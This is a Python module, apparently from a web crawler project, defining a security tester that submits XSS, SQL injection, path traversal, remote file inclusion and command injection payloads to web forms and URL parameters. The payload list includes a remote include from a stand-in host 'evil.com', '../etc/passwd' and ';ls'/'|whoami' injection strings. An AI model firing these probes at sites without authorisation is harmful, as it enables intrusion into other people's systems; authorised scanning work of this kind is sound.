"""
Production-grade security tester for Advanced Intelligent Web Crawler
Handles vulnerability scanning, payload management, and AI/Logger integration
"""

from typing import Dict, Any, List, Optional
from .logger import Logger
from .ai_analyzer import AIAnalyzer
import asyncio
import random
import time
import json

class SecurityTester:
    """
    Security tester for automated vulnerability scanning
    """
    def __init__(self, config, logger: Logger, ai_analyzer: AIAnalyzer):
        self.config = config
        self.logger = logger
        self.ai_analyzer = ai_analyzer
        self.payloads = self._load_payloads()

    def _load_payloads(self) -> Dict[str, List[str]]:
        """Load or generate payloads for security testing"""
        # In production, load from config or external file if provided
        if self.config.advanced.custom_payloads_file:
            try:
                with open(self.config.advanced.custom_payloads_file, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except Exception as e:
                self.logger.warning(f"Failed to load custom payloads: {e}", 'security_tester')
        # Default payloads
        return {
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>"
            ],
            'sqli': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT 1,2,3--"
            ],
            'lfi': [
                "../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
            ],
            'rfi': [
                "http://evil.com/shell.txt"
            ],
            'command_injection': [
                "; ls -la",
                "| whoami"
            ]
        }

    async def test_xss(self, browser, url: str, inputs: List[Any]):
        """Test for XSS vulnerabilities"""
        for payload in self.payloads['xss'][:self.config.security.max_payloads_per_type]:
            for input_field in inputs:
                try:
                    input_field.clear()
                    input_field.send_keys(payload)
                    # Try to submit
                    submit_buttons = await browser.find_elements('css selector', "input[type='submit'], button[type='submit'], button")
                    if submit_buttons:
                        submit_buttons[0].click()
                        await asyncio.sleep(2)
                        # Check for alert
                        try:
                            alert = browser.driver.switch_to.alert
                            if alert:
                                self.logger.log_security_event('xss', f"XSS confirmed with payload: {payload}", 'high', {'payload': payload}, url)
                                alert.accept()
                        except Exception:
                            pass
                        await browser.navigate_to(url)
                        await asyncio.sleep(1)
                except Exception as e:
                    self.logger.warning(f"Error testing XSS: {e}", 'security_tester')

    async def test_sqli(self, browser, url: str):
        """Test for SQL injection vulnerabilities"""
        for payload in self.payloads['sqli'][:self.config.security.max_payloads_per_type]:
            test_url = f"{url}?id={payload}"
            try:
                await browser.navigate_to(test_url)
                await asyncio.sleep(2)
                page_source = await browser.get_page_source()
                if any(err in (page_source or '').lower() for err in ["sql syntax", "mysql_fetch", "warning: mysql"]):
                    self.logger.log_security_event('sqli', f"SQLi confirmed with payload: {payload}", 'critical', {'payload': payload}, test_url)
            except Exception as e:
                self.logger.warning(f"Error testing SQLi: {e}", 'security_tester')

    async def run_all_tests(self, browser, url: str):
        """Run all enabled security tests"""
        self.logger.info(f"Starting security tests for {url}", 'security_tester')
        # Example: Find all input fields
        inputs = await browser.find_elements('tag name', 'input')
        await self.test_xss(browser, url, inputs)
        await self.test_sqli(browser, url)
        # Add more tests as needed
        self.logger.info(f"Completed security tests for {url}", 'security_tester') 